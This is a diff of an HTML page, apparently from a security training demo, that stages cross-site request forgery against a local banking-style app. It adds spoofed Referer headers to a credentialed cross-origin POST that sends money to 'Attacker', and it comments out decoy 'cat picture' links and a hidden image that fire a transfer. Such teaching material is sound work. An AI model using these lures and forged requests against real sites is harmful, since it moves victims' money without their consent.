@@ -25,6 +25,10 @@
         $.ajax({
             url:"http://localhost:8080/api/victim/transfer-rest",
             method: "POST",
+            headers: {
+                "RefererXX":"http://victorrentea.ro/",
+                "Referer":"http://victorrentea.ro/"
+            },
             xhrFields: { withCredentials: true }, // CORS sending credentials
             data: JSON.stringify({
                 recipientFullName:"Attacker",
@@ -37,13 +41,13 @@
             }
         });
     }
-
-    $.ajax("http://localhost:8080/rest/user/current", {
-        method: "GET",
-        success: function(trainings) {
-            toastr.success("data:  " + trainings)
-        }
-    });
+    //
+    // $.ajax("http://localhost:8080/rest/user/current", {
+    //     method: "GET",
+    //     success: function(trainings) {
+    //         toastr.success("data:  " + trainings)
+    //     }
+    // });
 </script>
 
 <br/>
@@ -57,10 +61,11 @@
         <input type="submit" value="Free Download!">
     </form>
 </div>
-
+<!--
 <a href="http://localhost:8080/api/user/current" target="hack">poza cu pisica</a>
 <a href="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientName=ATTACKER&recipientIBAN=ABC&amount=100" target="hack">poza cu catzel</a>
 <img src="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientName=ATTACKER&recipientIBAN=ABC&amount=100" style="display: none" />
+<img src="https://victorrentea.ro/img/open-group-white.png"/>-->
 <!--<a href="http://localhost:8080/transfer?toIban=2423423423" target="hack">poza cu pisica</a>-->
 <iframe id="hack" name="hack"></iframe>
 <script>
